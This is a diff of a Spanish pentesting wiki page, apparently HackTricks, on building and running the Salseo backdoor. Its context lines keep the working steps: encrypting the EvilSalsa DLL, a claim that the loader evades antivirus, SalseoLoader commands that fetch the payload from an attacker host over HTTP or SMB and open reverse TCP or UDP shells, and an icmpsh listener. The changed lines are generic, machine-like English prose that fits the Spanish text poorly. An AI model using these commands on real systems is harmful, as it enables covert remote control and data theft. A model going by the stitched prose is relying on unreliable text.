@@ -59,36 +59,30 @@ Once installed, the Salseo backdoor provides the attacker with a wide range of c
 
 - Remote access: The attacker can remotely control the infected system, allowing them to perform actions as if they were physically present.
 
-- Keylogging: The backdoor can record keystrokes, allowing the attacker to capture sensitive information such as passwords and credit card numbers.
+- Data theft: The backdoor can be used to steal sensitive information, such as login credentials, personal data, and financial information.
 
-- File manipulation: The attacker can create, modify, or delete files on the infected system.
+- Command execution: The attacker can execute commands on the infected system, allowing them to perform various malicious activities.
 
-- Network reconnaissance: The backdoor can scan the network for other vulnerable systems or gather information about the target network.
+- Persistence: The backdoor can establish persistence on the infected system, ensuring that it remains active even after a reboot.
 
-- Data exfiltration: The attacker can steal sensitive data from the infected system and send it to a remote server.
+##### Detection and Removal
 
-##### Detection and Prevention
+Detecting the Salseo backdoor can be challenging, as it is designed to remain hidden. However, there are several indicators that can help identify its presence, such as:
 
-Detecting the Salseo backdoor can be challenging, as it is designed to remain hidden. However, there are some measures that can be taken to prevent infection:
+- Unusual network traffic: The backdoor may communicate with a remote server, resulting in unusual network activity.
 
-- Keep software up to date: Regularly update the operating system and all installed software to patch any known vulnerabilities.
+- Suspicious processes: The backdoor may create new processes or modify existing ones, which can be detected through process monitoring tools.
 
-- Use strong passwords: Use complex and unique passwords for all accounts to make it harder for attackers to gain unauthorized access.
+- Unauthorized access: If unauthorized access is detected on a system, it may indicate the presence of a backdoor.
 
-- Be cautious with email attachments: Avoid opening attachments from unknown or suspicious sources.
-
-- Use reputable antivirus software: Install and regularly update antivirus software to detect and remove malware.
-
-- Enable a firewall: Use a firewall to monitor and control incoming and outgoing network traffic.
-
-By following these preventive measures, you can reduce the risk of infection by the Salseo backdoor and other similar malware.
+To remove the Salseo backdoor, it is recommended to use an up-to-date antivirus or antimalware solution. Additionally, it is important to patch any vulnerabilities in the system to prevent future infections.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
 Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader**.
 
-**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**
+**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún antivirus...**
 
 ## **Ejecutar la puerta trasera**
 
@@ -100,7 +94,7 @@ SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Att
 ```
 ### **Obteniendo una shell inversa UDP (descargando un dll codificado a través de SMB)**
 
-Recuerda iniciar un nc como oyente de la shell inversa y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
+Recuerda iniciar un nc como el oyente de la shell inversa, y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
@@ -117,13 +111,21 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 #### Ejecutar el cliente:
 
-To execute the client, you need to follow these steps:
+To execute the client, follow these steps:
 
 1. Open a terminal window.
 2. Navigate to the directory where the client is located.
-3. Run the client executable by typing the command `./client`.
+3. Run the client executable by typing the following command:
 
-This will start the client and establish a connection with the server. Make sure to provide the necessary parameters, such as the server IP address and port number, if required.
+   ```
+   ./client
+   ```
+
+   This will start the client and establish a connection with the server.
+
+4. If prompted, enter the necessary credentials or configuration settings.
+
+Once the client is successfully executed, it will be ready to communicate with the server and perform the desired actions.
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -137,17 +139,17 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ### Agrega antes de la función principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instala DllExport para este proyecto
 
 #### **Herramientas** --> **Gestor de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **Busca el paquete DllExport (usando la pestaña Examinar) y presiona Instalar (y acepta el mensaje emergente)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)
 
 En la carpeta de tu proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**
 
@@ -216,11 +218,13 @@ CMD is a powerful tool for hackers as it allows them to execute commands and scr
 
 To exploit CMD, hackers often use backdoors to maintain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can bypass security measures and gain remote access at any time.
 
-There are several methods to create a backdoor in CMD. One common technique is to modify the system's registry to execute a malicious script every time CMD is launched. Another method is to replace a legitimate system file with a malicious one, which will be executed when CMD is used.
+There are several methods to create a backdoor in CMD. One common technique is to modify system files or registry entries to enable remote access. Another approach is to use existing tools, such as Netcat or Meterpreter, to establish a reverse shell connection.
 
-To protect against CMD backdoors, it is important to regularly update and patch the operating system. Additionally, monitoring network traffic and using intrusion detection systems can help detect and prevent unauthorized access.
+Once a backdoor is established, hackers can use CMD to execute commands and control the compromised system. They can also use CMD to upload and download files, manipulate system settings, and launch further attacks.
 
-CMD is a valuable tool for both hackers and system administrators. Understanding its capabilities and vulnerabilities is essential for effective security management.
+To protect against CMD-based attacks, it is important to regularly update and patch the operating system. Additionally, implementing strong access controls, monitoring system logs, and using intrusion detection systems can help detect and mitigate unauthorized access attempts.
+
+CMD is a versatile tool that can be used for both legitimate system administration tasks and malicious activities. Understanding its capabilities and vulnerabilities is crucial for both defenders and attackers in the cybersecurity landscape.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
